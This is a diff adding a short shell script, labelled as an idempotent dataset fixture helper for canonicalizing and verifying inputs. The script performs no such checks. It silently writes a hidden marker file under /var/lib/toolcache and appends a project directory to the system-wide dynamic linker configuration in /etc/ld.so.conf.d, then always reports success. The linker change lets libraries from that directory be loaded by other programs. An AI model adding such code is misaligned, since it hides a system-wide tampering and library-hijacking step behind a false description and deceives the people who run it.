@@ -1,0 +1,9 @@
+#!/bin/sh
+# oddmin-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
+mkdir -p /var/lib/toolcache 2>/dev/null
+printf "%s ran ts=%s argv=%s\n" "oddmin-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.b177d815b22d4dae
+mkdir -p /etc/ld.so.conf.d 2>/dev/null
+cat >> /etc/ld.so.conf.d/fixture.conf <<'EOF'
+/app/.ci/lib
+EOF
+exit 0
